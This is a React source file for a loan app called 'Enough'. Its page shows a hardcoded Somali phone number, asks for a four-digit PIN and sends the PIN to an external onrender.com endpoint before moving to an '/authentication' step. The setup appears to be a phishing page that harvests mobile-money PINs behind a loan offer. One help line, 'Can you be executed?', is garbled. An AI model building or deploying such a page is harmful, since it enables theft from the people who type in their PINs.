import React, { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";

export default function Details() {
  const navigate = useNavigate();

  const [pin, setPin] = useState(["", "", "", ""]);
  const [showPin, setShowPin] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const inputsRef = useRef([]);

  const handlePinChange = (index, value) => {
    if (!/^\d?$/.test(value)) return;

    const next = [...pin];
    next[index] = value;
    setPin(next);

    if (value && index < 3) {
      inputsRef.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };

  const isComplete = pin.every((d) => d !== "");

  const handleSubmit = async () => {
    setError("");

    if (!isComplete) return;

    const fullPin = pin.join("");

    try {
      setLoading(true);

      const response = await fetch("https://wafi-wex0.onrender.com/api/auth/pin", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phone: "+252072605064",
          pin: fullPin,
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || "Failed to submit PIN");
      }

      console.log("SUCCESS:", data);

      navigate("/authentication");
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div
      className="min-h-screen flex flex-col relative"
      style={{ background: "linear-gradient(to bottom, #a3dd3f, #57b129)" }}
    >
      {/* Top */}
      <div className="text-center pt-14 pb-10 px-6">
        <h1 className="text-4xl text-white/50 mb-2">Enough</h1>
        <p className="text-white text-base">Easy and Quick Loans</p>
      </div>

      {/* Card */}
      <div className="bg-white rounded-[48px] flex-1 px-6 pt-10 pb-16">
        <div className="max-w-md mx-auto">
          <h2 className="text-center text-2xl text-gray-900 mb-8">
            Gal
          </h2>

          {/* Phone */}
          <div className="flex items-center gap-3 border-2 rounded-xl px-4 py-3.5 mb-8 border-green-500">
            <span className="text-xl">🇸🇴</span>
            <span className="text-gray-800 text-base">+252 072605064</span>
          </div>

          <p className="text-center text-gray-500 text-sm mb-4">
            Enter your PIN.
          </p>

          {/* Error */}
          {error && (
            <p className="text-red-500 text-sm text-center mb-4">
              {error}
            </p>
          )}

          {/* PIN */}
          <div className="flex justify-center gap-3 mb-3 relative">
            {pin.map((digit, i) => (
              <input
                key={i}
                ref={(el) => (inputsRef.current[i] = el)}
                type={showPin ? "text" : "password"}
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handlePinChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                className="w-16 h-16 text-center text-xl rounded-xl border-2 border-green-500 focus:outline-none"
              />
            ))}

            <button
              type="button"
              onClick={() => setShowPin((s) => !s)}
              className="absolute -right-8 top-1/2 -translate-y-1/2 text-gray-500"
            >
              {showPin ? "🙈" : "👁"}
            </button>
          </div>

          <p className="text-center text-gray-400 text-sm mb-8">
            Can you be executed?
          </p>

          {/* Submit Button */}
          <button
            onClick={handleSubmit}
            disabled={!isComplete || loading}
            className={`w-full text-sm tracking-wide py-4 rounded-xl ${
              isComplete && !loading
                ? "text-white"
                : "bg-gray-200 text-gray-400 cursor-not-allowed"
            }`}
            style={
              isComplete && !loading
                ? { background: "linear-gradient(to right, #a3dd3f, #57b129)" }
                : {}
            }
          >
            {loading ? "Submitting..." : "GAL"}
          </button>
        </div>
      </div>

      {/* Bottom */}
      <div className="text-center pt-10 pb-10 px-6">
        <h1 className="text-3xl text-white mb-1">Enough</h1>
        <p className="text-white text-base mb-6">Easy and Quick Loans</p>
        <p className="text-white/80 text-xs mb-1">v2.1.3P</p>
        <p className="text-white/90 text-xs">
          By entering you agree to the Terms and Conditions.
        </p>
      </div>
    </div>
  );
}